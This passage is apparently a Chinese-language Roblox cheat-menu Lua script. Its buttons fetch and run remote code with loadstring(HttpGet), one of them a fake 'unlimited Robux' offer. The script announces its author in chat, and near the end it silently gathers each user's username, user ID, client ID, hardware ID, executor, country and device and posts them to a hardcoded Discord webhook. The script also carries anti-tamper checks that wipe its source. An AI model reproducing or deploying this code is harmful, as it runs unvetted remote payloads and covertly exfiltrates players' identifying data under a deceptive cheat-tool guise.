    Desc = "求你了",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-DO-NOT-EXECUTE-61096"))()
        WindUI:Notify({
            Title = "等掉",
            Content = "还敢点",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r币",
    Desc = "无限",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/SxhPVOyM/raw"))()
        WindUI:Notify({
            Title = "无限",
            Content = "r币😍",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local TARGET_NAME = "LQ007891046"
local TAG_TEXT = "刘某脚本作者"
local CHAT_MESSAGE = "欢迎刘某脚本作者进入服务器"

if LocalPlayer and LocalPlayer.Name == TARGET_NAME then
    return 
end

local function sendChatMessage(msg)
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannels = TextChatService:FindFirstChild("TextChannels")
        if textChannels then
            local rbxgc = textChannels:FindFirstChild("RBXGeneral")
            if rbxgc then
                rbxgc:SendAsync(msg)
            end
        end
    else
        local sayMessageEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if sayMessageEvent then
            local request = sayMessageEvent:FindFirstChild("SayMessageRequest")
            if request then
                request:FireServer(msg, "All")
            end
        end
    end
end

-- 创建头顶标签
local function createHeadTag(character)
    local head = character:WaitForChild("Head", 5)
    if not head then return end

    if head:FindFirstChild("AuthorTagGui") then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "AuthorTagGui"
    billboard.Adornee = head
    
    billboard.Size = UDim2.new(10, 0, 3, 0) 
    
    billboard.StudsOffset = Vector3.new(0, 4, 0) 
    billboard.AlwaysOnTop = true 
    billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    billboard.LightInfluence = 0 

    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = billboard
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = TAG_TEXT
    textLabel.TextScaled = true 
    textLabel.Font = Enum.Font.LuckiestGuy 
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    local gradient = Instance.new("UIGradient")
    gradient.Parent = textLabel
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 127, 0)),
        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(0.83, Color3.fromRGB(75, 0, 130)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(148, 0, 211))
    })

    billboard.Parent = head

    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not billboard.Parent or not billboard.Parent.Parent then
            connection:Disconnect()
            return
        end
        local time = tick() % 1
        gradient.Offset = Vector2.new(-1 + (time * 2), 0)
    end)
end

local function handleTargetPlayer(player)
    if player.Name == TARGET_NAME then
        sendChatMessage(CHAT_MESSAGE)
        if player.Character then
            createHeadTag(player.Character)
        end
        player.CharacterAdded:Connect(function(character)
            createHeadTag(character)
        end)
    end
end

-- 检测当前服务器玩家
for _, player in ipairs(Players:GetPlayers()) do
    handleTargetPlayer(player)
end

-- 检测新加入玩家
Players.PlayerAdded:Connect(function(player)
    handleTargetPlayer(player)
end)

local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

--设备
if game.UserInputService.TouchEnabled and not game.UserInputService.KeyboardEnabled and not game.UserInputService.MouseEnabled then
  device = "移动设备"
 elseif not game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
  device = "电脑"
 elseif game.UserInputService.TouchEnabled and game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
  device = "带触摸屏的电脑"
end

--会员
local player = game.Players.LocalPlayer
if player.MembershipType == Enum.MembershipType.Premium then
  Premium = "是"
 else
  Premium = "否"
end

local msg = {
  ["username"] = "刘某脚本使用通知",
  ["embeds"] = {
    {
      ["color"] = tonumber(tostring("0x32CD32")),
      ["title"] = "有人使用脚本正在记录" .. os.date("%H") .. "时" .. os.date("%M") .. "分",
      ["thumbnail"] = {
        ["url"] = AvatarImage,
      },
      ["fields"] = {
        {
          ["name"] = "用户名",
          ["value"] = game.Players.LocalPlayer.Name,
          ["inline"] = true
        },
        {
          ["name"] = "名称",
          ["value"] = game.Players.LocalPlayer.DisplayName,
          ["inline"] = true
        },
        {
          ["name"] = "用户ID",
          ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
          ["inline"] = true
        },
        {
          ["name"] = "客户端ID",
          ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
          ["inline"] = false
        },
        {
          ["name"] = "地图ID",
          ["value"] = "[" .. game.PlaceId .. "](" .. "https://www.roblox.com/games/" .. game.PlaceId .. ")",
          ["inline"] = true
        },
         {
          ["name"] = "地图名称",
          ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
          ["inline"] = true
        },
        {
          ["name"] = "使用的注入器",
          ["value"] = identifyexecutor() or getexecutorname() or "未知",
          ["inline"] = true
        },
        {
          ["name"] = "账号年龄",
          ["value"] = game.Players.LocalPlayer.AccountAge .. "天",
          ["inline"] = true
        },
        {
          ["name"] = "设备",
          ["value"] = device,
          ["inline"] = false
        },
        {
          ["name"] = "国家和语言",
          ["value"] = "国家: " .. game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
          ["inline"] = false
        },
        {
          ["name"] = "语言",
          ["value"] = " 语言: " .. game.Players.LocalPlayer.LocaleId,
          ["inline"] = false
        },
        {
          ["name"] = "会员状态",
          ["value"] = Premium,
          ["inline"] = false
        },
        {
          ["name"] = "HWID",
          ["value"] = gethwid(),
          ["inline"] = true
        },
      }
    }
  }
}

local request = http_request or request or HttpPost or syn.request
request({
  Url = "https://discord.com/api/webhooks/1468108097607172126/gLQm1hoN3Jsnlirk_t8zfgqVwUr_7AdEtLCGqQO5oNi2E7nJgrJOudijClcsuqpGwvc8",
  Method = "POST",
  Headers = {["Content-Type"] = "application/json"},
  Body = game.HttpService:JSONEncode(msg)
})

end

local function safeEntry()
    if not probeArith() then return nil, "block:arith" end
    if not probeCall()  then return nil, "block:call"  end
    if not probeFS()    then return nil, "block:fs"    end
    return coreLogic()
end

local success, tag = safeEntry()
if not success then
    warn("LM:已拦截异常执行 (" .. tostring(tag) .. ")")
    script:ClearAllChildren()
    script.Source = ""
    return
end